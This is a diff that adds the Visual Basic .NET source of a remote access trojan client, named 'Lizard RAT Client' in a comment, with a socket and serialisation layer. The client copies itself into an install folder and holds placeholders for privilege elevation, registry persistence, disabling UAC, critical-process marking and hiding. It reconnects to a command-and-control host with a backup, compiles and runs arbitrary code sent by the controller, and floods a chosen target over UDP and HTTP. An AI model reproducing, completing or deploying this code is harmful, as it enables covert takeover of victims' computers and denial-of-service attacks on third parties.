@@ -1,0 +1,897 @@
+﻿Imports System.Collections.Generic
+Imports System.Net.Sockets
+Imports System.Net
+Imports System.ComponentModel
+Imports System.IO
+Imports System.Text
+Imports System.Reflection
+Imports System.Threading
+Imports System.Security.Cryptography
+Imports System.Diagnostics
+Imports System.Runtime.InteropServices
+
+<Assembly: AssemblyTitle("Title")> 
+<Assembly: AssemblyDescription("Description")> 
+<Assembly: AssemblyCompany("Company")> 
+<Assembly: AssemblyProduct("Product")> 
+<Assembly: AssemblyCopyright("Copyright")> 
+<Assembly: AssemblyTrademark("Trademark")>
+<Assembly: AssemblyVersion("1.0.0.0")> 
+<Assembly: AssemblyFileVersion("1.0.0.0")>
+
+NotInheritable Class UserClient
+    Implements System.IDisposable
+
+    'TODO: Lock objects where needed.
+    'TODO: Create and handle ReadQueue?
+    'TODO: Provide option to disable buffering.
+
+#Region " Events "
+
+    Public Event ExceptionThrown As ExceptionThrownEventHandler
+    Public Delegate Sub ExceptionThrownEventHandler(sender As UserClient, ex As System.Exception)
+
+    Private Sub OnExceptionThrown(ex As System.Exception)
+        RaiseEvent ExceptionThrown(Me, ex)
+    End Sub
+
+    Public Event StateChanged As StateChangedEventHandler
+    Public Delegate Sub StateChangedEventHandler(sender As UserClient, connected As Boolean)
+
+    Private Sub OnStateChanged(connected As Boolean)
+        RaiseEvent StateChanged(Me, connected)
+    End Sub
+
+    Public Event ReadPacket As ReadPacketEventHandler
+    Public Delegate Sub ReadPacketEventHandler(sender As UserClient, data As Byte())
+
+    Private Sub OnReadPacket(data As Byte())
+        RaiseEvent ReadPacket(Me, data)
+    End Sub
+
+    Public Event ReadProgressChanged As ReadProgressChangedEventHandler
+    Public Delegate Sub ReadProgressChangedEventHandler(sender As UserClient, progress As Double, bytesRead As Integer, bytesToRead As Integer)
+
+    Private Sub OnReadProgressChanged(progress As Double, bytesRead As Integer, bytesToRead As Integer)
+        RaiseEvent ReadProgressChanged(Me, progress, bytesRead, bytesToRead)
+    End Sub
+
+    Public Event WritePacket As WritePacketEventHandler
+    Public Delegate Sub WritePacketEventHandler(sender As UserClient, size As Integer)
+
+    Private Sub OnWritePacket(size As Integer)
+        RaiseEvent WritePacket(Me, size)
+    End Sub
+
+    Public Event WriteProgressChanged As WriteProgressChangedEventHandler
+    Public Delegate Sub WriteProgressChangedEventHandler(sender As UserClient, progress As Double, bytesWritten As Integer, bytesToWrite As Integer)
+
+    Private Sub OnWriteProgressChanged(progress As Double, bytesWritten As Integer, bytesToWrite As Integer)
+        RaiseEvent WriteProgressChanged(Me, progress, bytesWritten, bytesToWrite)
+    End Sub
+
+#End Region
+
+#Region " Properties "
+
+    Private _BufferSize As UShort = 8192
+    Public Property BufferSize() As UShort
+        Get
+            Return _BufferSize
+        End Get
+        Set(value As UShort)
+            If value < 1 Then
+                Throw New System.Exception("Value must be greater than 0.")
+            Else
+                _BufferSize = value
+            End If
+        End Set
+    End Property
+
+    Private _MaxPacketSize As Integer = 10485760
+    Public Property MaxPacketSize() As Integer
+        Get
+            Return _MaxPacketSize
+        End Get
+        Set(value As Integer)
+            If value < 1 Then
+                Throw New System.Exception("Value must be greater than 0.")
+            Else
+                _MaxPacketSize = value
+            End If
+        End Set
+    End Property
+
+    Private _KeepAlive As Boolean = True
+    Public Property KeepAlive() As Boolean
+        Get
+            Return _KeepAlive
+        End Get
+        Set(value As Boolean)
+            If _Connected Then
+                Throw New System.Exception("Unable to change this option while connected.")
+            Else
+                _KeepAlive = value
+            End If
+        End Set
+    End Property
+
+    Private _UserState As Object
+    Public Property UserState() As Object
+        Get
+            Return _UserState
+        End Get
+        Set(value As Object)
+            _UserState = value
+        End Set
+    End Property
+
+    Private _EndPoint As System.Net.IPEndPoint
+    Public ReadOnly Property EndPoint() As System.Net.IPEndPoint
+        Get
+            If _EndPoint IsNot Nothing Then
+                Return _EndPoint
+            Else
+                Return New System.Net.IPEndPoint(System.Net.IPAddress.None, 0)
+            End If
+        End Get
+    End Property
+
+    Private _Connected As Boolean
+    Public ReadOnly Property Connected() As Boolean
+        Get
+            Return _Connected
+        End Get
+    End Property
+
+#End Region
+
+    Private O As System.ComponentModel.AsyncOperation
+    Private Handle As System.Net.Sockets.Socket
+
+    Private SendIndex As Integer
+    Private SendBuffer As Byte()
+
+    Private ReadIndex As Integer
+    Private ReadBuffer As Byte()
+
+    Private SendQueue As System.Collections.Generic.Queue(Of Byte())
+
+    Private Items As System.Net.Sockets.SocketAsyncEventArgs()
+    Private Processing As Boolean() = New Boolean(1) {}
+
+    Sub New()
+        O = System.ComponentModel.AsyncOperationManager.CreateOperation(Nothing)
+    End Sub
+
+    Public Sub Connect(host As String, port As UShort)
+        Try
+            Disconnect()
+            Initialize()
+
+            Dim IP As System.Net.IPAddress = System.Net.IPAddress.None
+            If System.Net.IPAddress.TryParse(host, IP) Then
+                DoConnect(IP, port)
+            Else
+                System.Net.Dns.BeginGetHostEntry(host, AddressOf EndGetHostEntry, port)
+            End If
+        Catch ex As System.Exception
+            OnExceptionThrown(ex)
+            Disconnect()
+        End Try
+    End Sub
+
+    Private Sub EndGetHostEntry(r As System.IAsyncResult)
+        Try
+            DoConnect(System.Net.Dns.EndGetHostEntry(r).AddressList(0), DirectCast(r.AsyncState, UShort))
+        Catch ex As System.Exception
+            OnExceptionThrown(ex)
+            Disconnect()
+        End Try
+    End Sub
+
+    Private Sub DoConnect(ip As System.Net.IPAddress, port As UShort)
+        Try
+            Handle = New System.Net.Sockets.Socket(System.Net.Sockets.AddressFamily.InterNetwork, System.Net.Sockets.SocketType.Stream, System.Net.Sockets.ProtocolType.Tcp)
+            Handle.NoDelay = True
+
+            If _KeepAlive Then
+                Handle.SetSocketOption(System.Net.Sockets.SocketOptionLevel.Socket, System.Net.Sockets.SocketOptionName.KeepAlive, 20000)
+            End If
+
+            Items(0).RemoteEndPoint = New System.Net.IPEndPoint(ip, port)
+            If Not Handle.ConnectAsync(Items(0)) Then
+                Process(Nothing, Items(0))
+            End If
+        Catch ex As System.Exception
+            OnExceptionThrown(ex)
+            Disconnect()
+        End Try
+    End Sub
+
+    Private Sub Initialize()
+        Processing = New Boolean(1) {}
+
+        SendIndex = 0
+        ReadIndex = 0
+
+        SendBuffer = New Byte(-1) {}
+        ReadBuffer = New Byte(-1) {}
+
+        SendQueue = New System.Collections.Generic.Queue(Of Byte())()
+
+        Items = New System.Net.Sockets.SocketAsyncEventArgs(1) {}
+
+        Items(0) = New System.Net.Sockets.SocketAsyncEventArgs()
+        Items(1) = New System.Net.Sockets.SocketAsyncEventArgs()
+        AddHandler Items(0).Completed, AddressOf Process
+        AddHandler Items(1).Completed, AddressOf Process
+    End Sub
+
+    Private Sub Process(s As Object, e As System.Net.Sockets.SocketAsyncEventArgs)
+        Try
+            If e.SocketError = System.Net.Sockets.SocketError.Success Then
+                Select Case e.LastOperation
+                    Case System.Net.Sockets.SocketAsyncOperation.Connect
+                        _EndPoint = DirectCast(Handle.RemoteEndPoint, System.Net.IPEndPoint)
+                        _Connected = True
+                        Items(0).SetBuffer(New Byte(_BufferSize - 1) {}, 0, _BufferSize)
+
+                        OnStateChanged(True)
+                        If Not Handle.ReceiveAsync(e) Then
+                            Process(Nothing, e)
+                        End If
+                    Case System.Net.Sockets.SocketAsyncOperation.Receive
+                        If Not _Connected Then Return
+
+                        If Not e.BytesTransferred = 0 Then
+                            HandleRead(e.Buffer, 0, e.BytesTransferred)
+
+                            If Not Handle.ReceiveAsync(e) Then
+                                Process(Nothing, e)
+                            End If
+                        Else
+                            Disconnect()
+                        End If
+                    Case System.Net.Sockets.SocketAsyncOperation.Send
+                        If Not _Connected Then Return
+
+                        Dim EOS As Boolean
+                        SendIndex += e.BytesTransferred
+
+                        O.Post(AddressOf WriteProgressChangedCallback, New Object() {(SendIndex / SendBuffer.Length) * 100, SendIndex, SendBuffer.Length})
+
+                        If (SendIndex >= SendBuffer.Length) Then
+                            EOS = True
+                            OnWritePacket(SendBuffer.Length - 4)
+                        End If
+
+                        If SendQueue.Count = 0 AndAlso EOS Then
+                            Processing(1) = False
+                        Else
+                            HandleSendQueue()
+                        End If
+                End Select
+            Else
+                OnExceptionThrown(New System.Net.Sockets.SocketException(e.SocketError))
+                Disconnect()
+            End If
+        Catch ex As System.Exception
+            OnExceptionThrown(ex)
+            Disconnect()
+        End Try
+    End Sub
+
+    Public Sub Disconnect()
+        On Error Resume Next
+        If Processing(0) Then
+            Return
+        Else
+            Processing(0) = True
+        End If
+
+        Dim Raise As Boolean = _Connected
+        _Connected = False
+
+        If Handle IsNot Nothing Then
+            Handle.Close()
+        End If
+
+        If SendQueue IsNot Nothing Then
+            SendQueue.Clear()
+        End If
+
+        SendBuffer = New Byte(-1) {}
+        ReadBuffer = New Byte(-1) {}
+
+        If Raise Then
+            OnStateChanged(False)
+        End If
+
+        If Items IsNot Nothing Then
+            Items(0).Dispose()
+            Items(1).Dispose()
+        End If
+
+        _UserState = Nothing
+        _EndPoint = Nothing
+    End Sub
+
+    Public Sub Send(data As Byte())
+        If Not _Connected Then Return
+
+        SendQueue.Enqueue(data)
+
+        If Not Processing(1) Then
+            Processing(1) = True
+            HandleSendQueue()
+        End If
+    End Sub
+
+    Private Sub HandleSendQueue()
+        Try
+            If SendIndex >= SendBuffer.Length Then
+                SendIndex = 0
+                SendBuffer = Header(SendQueue.Dequeue())
+            End If
+
+            Dim Write As Integer = System.Math.Min(SendBuffer.Length - SendIndex, _BufferSize)
+            Items(1).SetBuffer(SendBuffer, SendIndex, Write)
+
+            If Not Handle.SendAsync(Items(1)) Then
+                Process(Nothing, Items(1))
+            End If
+        Catch ex As System.Exception
+            OnExceptionThrown(ex)
+            Disconnect()
+        End Try
+    End Sub
+
+    Private Function Header(data As Byte()) As Byte()
+        Dim T As Byte() = New Byte(data.Length + 3) {}
+        System.Buffer.BlockCopy(System.BitConverter.GetBytes(data.Length), 0, T, 0, 4)
+        System.Buffer.BlockCopy(data, 0, T, 4, data.Length)
+        Return T
+    End Function
+
+    Private Sub HandleRead(data As Byte(), index As Integer, length As Integer)
+        If ReadIndex >= ReadBuffer.Length Then
+            ReadIndex = 0
+            If data.Length < 4 Then
+                OnExceptionThrown(New System.Exception("Missing or corrupt packet header."))
+                Disconnect()
+                Return
+            End If
+
+            Dim PacketSize As Integer = System.BitConverter.ToInt32(data, index)
+            If PacketSize > _MaxPacketSize Then
+                OnExceptionThrown(New System.Exception("Packet size exceeds MaxPacketSize."))
+                Disconnect()
+                Return
+            End If
+
+            System.Array.Resize(ReadBuffer, PacketSize)
+            index += 4
+        End If
+
+        Dim Read As Integer = System.Math.Min(ReadBuffer.Length - ReadIndex, length - index)
+        System.Buffer.BlockCopy(data, index, ReadBuffer, ReadIndex, Read)
+        ReadIndex += Read
+
+        O.Post(AddressOf ReadProgressChangedCallback, New Object() {(ReadIndex / ReadBuffer.Length) * 100, ReadIndex, ReadBuffer.Length})
+
+        If ReadIndex >= ReadBuffer.Length Then
+            Dim BufferClone(ReadBuffer.Length - 1) As Byte 'Race condition fail-safe.
+            System.Buffer.BlockCopy(ReadBuffer, 0, BufferClone, 0, ReadBuffer.Length)
+
+            OnReadPacket(BufferClone)
+        End If
+
+        If Read < (length - index) Then
+            HandleRead(data, index + Read, length)
+        End If
+    End Sub
+
+    Private Sub ReadProgressChangedCallback(arg As Object)
+        Dim Params As Object() = DirectCast(arg, Object())
+        OnReadProgressChanged(DirectCast(Params(0), Double), DirectCast(Params(1), Integer), DirectCast(Params(2), Integer))
+    End Sub
+
+    Private Sub WriteProgressChangedCallback(arg As Object)
+        Dim Params As Object() = DirectCast(arg, Object())
+        OnWriteProgressChanged(DirectCast(Params(0), Double), DirectCast(Params(1), Integer), DirectCast(Params(2), Integer))
+    End Sub
+
+#Region " IDisposable Support "
+
+    Private DisposedValue As Boolean
+
+    Private Sub Dispose(disposing As Boolean)
+        If Not DisposedValue AndAlso disposing Then Disconnect()
+        DisposedValue = True
+    End Sub
+
+    Public Sub Dispose() Implements System.IDisposable.Dispose
+        Dispose(True)
+        System.GC.SuppressFinalize(Me)
+    End Sub
+
+#End Region
+
+End Class
+
+NotInheritable Class Pack
+
+    Private Table As System.Collections.Generic.Dictionary(Of System.Type, Byte)
+    Public Sub New()
+        Table = New System.Collections.Generic.Dictionary(Of System.Type, Byte)()
+
+        Table.Add(GetType(Boolean), 0)
+        Table.Add(GetType(Byte), 1)
+        Table.Add(GetType(Byte()), 2)
+        Table.Add(GetType(Char), 3)
+        Table.Add(GetType(Char()), 4)
+        Table.Add(GetType(Decimal), 5)
+        Table.Add(GetType(Double), 6)
+        Table.Add(GetType(Integer), 7)
+        Table.Add(GetType(Long), 8)
+        Table.Add(GetType(SByte), 9)
+        Table.Add(GetType(Short), 10)
+        Table.Add(GetType(Single), 11)
+        Table.Add(GetType(String), 12)
+        Table.Add(GetType(UInteger), 13)
+        Table.Add(GetType(ULong), 14)
+        Table.Add(GetType(UShort), 15)
+        Table.Add(GetType(System.DateTime), 16)
+    End Sub
+
+    Public Function Serialize(ParamArray data As Object()) As Byte()
+        Dim Stream As New System.IO.MemoryStream()
+        Dim Writer As New System.IO.BinaryWriter(Stream, System.Text.Encoding.UTF8)
+        Dim Current As Byte = 0
+
+        Writer.Write(System.Convert.ToByte(data.Length))
+
+        For I As Integer = 0 To data.Length - 1
+            Current = Table(data(I).GetType())
+            Writer.Write(Current)
+
+            Select Case Current
+                Case 0
+                    Writer.Write(DirectCast(data(I), Boolean))
+                Case 1
+                    Writer.Write(DirectCast(data(I), Byte))
+                Case 2
+                    Writer.Write(DirectCast(data(I), Byte()).Length)
+                    Writer.Write(DirectCast(data(I), Byte()))
+                Case 3
+                    Writer.Write(DirectCast(data(I), Char))
+                Case 4
+                    Writer.Write(DirectCast(data(I), Char()).ToString())
+                Case 5
+                    Writer.Write(DirectCast(data(I), Decimal))
+                Case 6
+                    Writer.Write(DirectCast(data(I), Double))
+                Case 7
+                    Writer.Write(DirectCast(data(I), Integer))
+                Case 8
+                    Writer.Write(DirectCast(data(I), Long))
+                Case 9
+                    Writer.Write(DirectCast(data(I), SByte))
+                Case 10
+                    Writer.Write(DirectCast(data(I), Short))
+                Case 11
+                    Writer.Write(DirectCast(data(I), Single))
+                Case 12
+                    Writer.Write(DirectCast(data(I), String))
+                Case 13
+                    Writer.Write(DirectCast(data(I), UInteger))
+                Case 14
+                    Writer.Write(DirectCast(data(I), ULong))
+                Case 15
+                    Writer.Write(DirectCast(data(I), UShort))
+                Case 16
+                    Writer.Write(DirectCast(data(I), Date).ToBinary())
+            End Select
+        Next
+
+        Writer.Close()
+        Return Stream.ToArray()
+    End Function
+
+    Public Function Deserialize(data As Byte()) As Object()
+        Dim Stream As New System.IO.MemoryStream(data)
+        Dim Reader As New System.IO.BinaryReader(Stream, System.Text.Encoding.UTF8)
+        Dim Items As New System.Collections.Generic.List(Of Object)()
+        Dim Current As Byte = 0
+        Dim Count As Byte = Reader.ReadByte()
+
+        For I As Integer = 0 To Count - 1
+            Current = Reader.ReadByte()
+
+            Select Case Current
+                Case 0
+                    Items.Add(Reader.ReadBoolean())
+                Case 1
+                    Items.Add(Reader.ReadByte())
+                Case 2
+                    Items.Add(Reader.ReadBytes(Reader.ReadInt32()))
+                Case 3
+                    Items.Add(Reader.ReadChar())
+                Case 4
+                    Items.Add(Reader.ReadString().ToCharArray())
+                Case 5
+                    Items.Add(Reader.ReadDecimal())
+                Case 6
+                    Items.Add(Reader.ReadDouble())
+                Case 7
+                    Items.Add(Reader.ReadInt32())
+                Case 8
+                    Items.Add(Reader.ReadInt64())
+                Case 9
+                    Items.Add(Reader.ReadSByte())
+                Case 10
+                    Items.Add(Reader.ReadInt16())
+                Case 11
+                    Items.Add(Reader.ReadSingle())
+                Case 12
+                    Items.Add(Reader.ReadString())
+                Case 13
+                    Items.Add(Reader.ReadUInt32())
+                Case 14
+                    Items.Add(Reader.ReadUInt64())
+                Case 15
+                    Items.Add(Reader.ReadUInt16())
+                Case 16
+                    Items.Add(System.DateTime.FromBinary(Reader.ReadInt64()))
+            End Select
+        Next
+
+        Reader.Close()
+        Return Items.ToArray()
+    End Function
+End Class
+
+[ClassCritical]
+
+Module Client
+    Private Packer As New Pack
+    Private WithEvents c As New UserClient
+
+    Public Authorized As Boolean
+    Public SecureConnection As Boolean
+	Private objMutex As System.Threading.Mutex
+    Private group As String = "[group]"
+    Private version As String = "[version]"
+	Private installpath as string = System.Environment.GetFolderPath(System.Environment.SpecialFolder.[installpath]) & "[folder]"
+	Private sname as String = "[sname]"
+	Private startname as String = "[startname]"
+	Private startnameLM as String = "[startnameLM]"
+	Private passwd as String = "[passwd]"
+	Private udpClient As New System.Net.Sockets.UdpClient
+	Private GLOIP As System.Net.IPAddress
+	Private UDP as Boolean = false
+	Private httprun as boolean = false
+	Private usebackuphost as boolean = false
+
+    Private encryptor As System.Security.Cryptography.ICryptoTransform
+    Private decryptor As System.Security.Cryptography.ICryptoTransform
+    Private szResult As String = ""
+    Private cname As String = ""
+	Private identity As System.Security.Principal.WindowsIdentity = System.Security.Principal.WindowsIdentity.GetCurrent()
+    Private principal As System.Security.Principal.WindowsPrincipal = New System.Security.Principal.WindowsPrincipal(identity)
+    Private isElevated As Boolean = principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator)
+	
+
+
+
+    Function encrypt(data As Byte()) As Byte()
+        Return encryptor.TransformFinalBlock(data, 0, data.Length)
+    End Function
+
+    Function decrypt(data As Byte()) As Byte()
+        Return decryptor.TransformFinalBlock(data, 0, data.Length)
+    End Function
+
+    Enum PacketHeader As Byte
+        Handshake = 0
+        Compile = 1
+        Authorize = 2
+        Ping = 3
+        Ender = 4
+	StartUDP = 29
+	StopUDP = 30
+	StartHTTP = 31
+	StopHTTP = 32
+    End Enum
+
+	Private needadmin as boolean = [admin]
+
+#Region " Helper Methods "
+    Sub SendPacket(ParamArray args As Object())
+        Dim data As Byte() = Packer.Serialize(args)
+        If SecureConnection Then
+            data = encrypt(data)
+        End If
+        c.Send(Data)
+    End Sub
+
+    Sub compile(ByVal source As String)
+        Dim objCodeCompiler As New Microsoft.VisualBasic.VBCodeProvider()
+
+        Dim objCompilerParameters As New System.CodeDom.Compiler.CompilerParameters
+        objCompilerParameters.ReferencedAssemblies.Add("System.dll")
+        objCompilerParameters.ReferencedAssemblies.Add("System.Drawing.dll")
+        objCompilerParameters.ReferencedAssemblies.Add("System.Windows.Forms.dll")
+        objCompilerParameters.ReferencedAssemblies.Add("Microsoft.VisualBasic.dll")
+		objCompilerParameters.ReferencedAssemblies.Add("System.ServiceProcess.dll")
+		objCompilerParameters.ReferencedAssemblies.Add("System.Management.dll")
+		
+        objCompilerParameters.GenerateInMemory = True
+        objCompilerParameters.TreatWarningsAsErrors = False
+
+        Dim strCode As String = source
+        Dim objCompileResults As System.CodeDom.Compiler.CompilerResults = objCodeCompiler.CompileAssemblyFromSource(objCompilerParameters, strCode)
+
+        If objCompileResults.Errors.HasErrors Then
+            'System.Windows.Forms.Messagebox.show("Error: Line>" & objCompileResults.Errors(0).Line.ToString & ", " & objCompileResults.Errors(0).ErrorText)
+            Exit Sub
+        End If
+
+        Dim objAssembly As System.Reflection.Assembly = objCompileResults.CompiledAssembly
+        Dim objTheClass As Object = objAssembly.CreateInstance("Client")
+
+        If objTheClass Is Nothing Then
+            'System.Console.Writeline("Error in objtheclass")
+            Exit Sub
+        End If
+
+        Try
+            Dim objResult As Object = objTheClass.GetType.InvokeMember("Main", System.Reflection.BindingFlags.InvokeMethod, Nothing, objTheClass, Nothing)
+        Catch ex As System.Exception
+            'System.Console.Writeline("Exception: " & ex.ToString)
+        End Try
+    End Sub
+
+#End Region
+
+#Region " Packet Senders "
+
+    Sub SendHandshakePacket(data As Byte())
+        SendPacket(CByte(PacketHeader.Handshake), data)
+    End Sub
+
+    Sub SendAuthorizePacket(data As Byte())
+        SendPacket(CByte(PacketHeader.Authorize), data)
+    End Sub
+
+    Sub SendPingPacket()
+        SendPacket(CByte(PacketHeader.Ping))
+    End Sub
+
+#End Region
+
+#Region " Packet Handlers "
+    Sub HandleHandshakePacket(values As Object())
+        Dim PublicKey As Byte() = DirectCast(values(1), Byte())
+        cname = DirectCast(values(2), String)
+
+        Dim RSA As New System.Security.Cryptography.RSACryptoServiceProvider(2048)
+        RSA.ImportCspBlob(PublicKey)
+
+        Dim r As New System.Security.Cryptography.RijndaelManaged()
+        encryptor = r.CreateEncryptor()
+        decryptor = r.CreateDecryptor()
+
+        Dim data As Byte() = Packer.Serialize(r.Key, r.IV, passwd)
+        data = RSA.Encrypt(data, True)
+
+        SendHandshakePacket(data)
+
+        SecureConnection = True
+    End Sub
+
+    Sub HandleStartHTTPPacket(values as Object())
+	Dim Host As String
+        Dim Http As New System.Net.WebClient()
+	Host = values(1).ToString
+	httprun = true
+            While(httprun)
+                Try
+                    Http.DownloadString(Host)
+                Catch : End Try
+            End While
+    End Sub
+
+    Sub HandleStopHTTPPacket(values as Object())
+	httprun = false
+    End Sub
+
+    Sub HandleStartUDPPacket(values as Object())
+	udp = true
+	While(udp)
+		Dim bytCommand As Byte() = New Byte() {}
+		GLOIP = System.Net.IPAddress.Parse(DirectCast(values(1),String)) '<---
+		udpClient.Connect(GLOIP, DirectCast(values(2),String)) '<---
+		bytCommand = Encoding.ASCII.GetBytes("BLAAAAAAAAAAAAAAA!/asldifrhaslkdfhaseoirfhasdhfjasdzf483975634597328528934tzheufgz34975638q9ruweirf? ? hsdkjvnwu45z6384975weuirhjsfndjvzw438563q84ruwajfjsadfhdfhgq349875q390ruf)=/()%&§%&%")
+		udpClient.Send(bytCommand, bytCommand.Length)
+	End While
+    End Sub
+
+    Sub HandleStopUDPPacket()
+	udp = false
+    End Sub
+
+    Sub HandleCompilePacket(values As Object())
+        Dim source As String = DirectCast(values(1), String)
+        source = source.Replace("*-*host*-*", DirectCast(values(2), String))
+        source = source.Replace("*-*port*-*", DirectCast(values(3), String))
+        source = source.Replace("*-*endpoint*-*", DirectCast(values(4), String))
+        source = source.Replace("*-*group*-*", group)
+        source = source.Replace("*-*version*-*", version)
+		source = source.Replace("*-*startname*-*", startname)
+		source = source.Replace("*-*startnameLM*-*", startnameLM)
+        compile(source)
+    End Sub
+
+    Sub HandlePingPacket()
+        SendPingPacket()
+    End Sub
+
+#End Region
+
+	Sub CloseProg()
+	try
+	[DimCritical]
+	[UndoCritical]
+	system.Environment.Exit(0)
+	catch ex as System.Exception
+	System.Environment.Exit(0)
+	End Try
+	End Sub
+
+    Sub Main()
+	Try
+		[visible]
+        'System.Console.Writeline("Lizard RAT Client " & version & " started")
+		objMutex = New System.Threading.Mutex(False, "[mutex]")		
+        If objMutex.WaitOne(0, False) = False Then
+            objMutex.Close()
+            objMutex = Nothing
+            'System.Console.Writeline("Another instance of the RWX RAT Client is already running")
+            CloseProg()
+        End If
+		If not sname.contains(".exe") then
+			sname += ".exe"
+		end if
+        If System.Reflection.Assembly.GetExecutingAssembly().Location = installpath & "\" & sname Then ' Server Location = Install Location
+			if not iselevated then
+				[Elevate]
+			else
+				[DimCritical]
+				[MakeCritical]
+				[RunHKLM]
+				[DisableUAC]
+			end if
+			[RunHKCU]
+			[RunOnceRefresh]
+			[Hidden]
+			[Hide]
+			If System.IO.File.Exists(installpath & "\update.exe") Then
+                System.IO.File.Delete(installpath & "\update.exe")
+            End If
+            'System.Console.Writeline("Connecting to host...")
+            'System.Console.Writeline("")
+            c.Connect("[host]", [port])
+			'System.Console.ReadKey()
+			System.Windows.Forms.Application.Run()
+        Else
+            If System.IO.Directory.Exists(installpath) = False Then ' Creates the extra directory (if needed)
+			    'System.Console.Writeline("Creating Installdirectory")
+                System.IO.Directory.CreateDirectory(installpath)
+            End If
+
+            If System.IO.File.Exists(installpath & "\" & sname) Then
+                System.IO.File.Delete(installpath & "\" & sname)
+            End If
+            System.IO.File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, installpath & "\" & sname, True) ' Copys the server to his install location
+			'System.Console.Writeline("Copying File to Installdirectory")
+			[RunOnce]
+			System.Diagnostics.Process.Start(installpath & "\" & sname) ' Starts the installed server
+			CloseProg()
+        End If
+        Catch ex as System.Exception
+			'System.Console.Writeline("Exception: " & ex.ToString)
+		End Try
+    End Sub
+
+	[visiblehandler]
+	[HandlerCritical]
+	[FuncElevate]
+	[FuncHKLM]
+	[FuncHKCU]
+	[FuncOnce]
+	[FuncDisableUAC]
+	[FuncHidden]
+	[FuncHide]
+
+
+#Region " Client Events "
+    Sub client_StateChanged(sender As UserClient, connected As Boolean) Handles c.StateChanged
+        'System.Console.Writeline("connected = " & connected)
+        If Not connected Then
+            System.Threading.Thread.Sleep(2000)
+            SecureConnection = False
+            c.Disconnect()
+            c.Dispose()
+            c = New UserClient
+            'System.Console.Writeline("Connecting to host...")
+            'System.Console.Writeline("")
+            c.Connect("[host]", [port])
+        Else
+            'System.Console.Writeline("connected to: " & sender.EndPoint.ToString)
+            'System.Console.Writeline("")
+        End If
+    End Sub
+
+    Sub client_ExceptionThrown(sender As UserClient, ex As System.Exception) Handles c.ExceptionThrown
+        'System.Console.Writeline("Exception: " & ex.ToString)
+	usebackuphost = Not(usebackuphost)
+
+        System.Threading.Thread.Sleep(2000)
+        SecureConnection = False
+        c.Disconnect()
+        c.Dispose()
+        c = New UserClient
+        'System.Console.Writeline("Connecting to host...")
+        'System.Console.Writeline("")
+	if usebackuphost = false then
+	        c.Connect("[host]", [port])
+	else
+	        c.Connect("[backuphost]", [port])
+	end if
+    End Sub
+
+    Sub client_ReadPacket(sender As UserClient, data() As Byte) Handles c.ReadPacket
+        'System.Console.Writeline("Received Bytes: " & data.Length)
+        If SecureConnection Then
+            data = decrypt(data)
+        End If
+
+        Dim values As Object() = Packer.Deserialize(data)
+        If values Is Nothing OrElse values.Length = 0 Then Return
+
+        Select Case DirectCast(values(0), PacketHeader)
+            Case PacketHeader.Handshake
+                'System.Console.Writeline("Received Handshake Packet")
+                HandleHandshakePacket(values)
+            Case PacketHeader.Compile
+                'System.Windows.Forms.Messagebox.show("Received Compile Packet")
+                HandleCompilePacket(values)
+            Case PacketHeader.Ping
+                'System.Console.Writeline("Received Ping Packet")
+                HandlePingPacket()
+            Case PacketHeader.Ender
+                'System.Console.Writeline("Received End Packet")
+                CloseProg()
+	    Case PacketHeader.StartUDP
+		HandleStartUDPPacket(values)
+	    Case PacketHeader.StopUDP
+		HandleStopUDPPacket()
+        End Select
+    End Sub
+
+    Sub client_ReadProgressChanged(sender As UserClient, progress As Double, bytesRead As Integer, bytesToRead As Integer) Handles c.ReadProgressChanged
+
+    End Sub
+
+    Sub client_WritePacket(sender As UserClient, size As Integer) Handles c.WritePacket
+        'System.Console.Writeline("Sent Bytes: " & size)
+    End Sub
+
+    Sub client_WriteProgressChanged(sender As UserClient, progress As Double, bytesWritten As Integer, bytesToWrite As Integer) Handles c.WriteProgressChanged
+
+    End Sub
+#End Region
+
+End Module
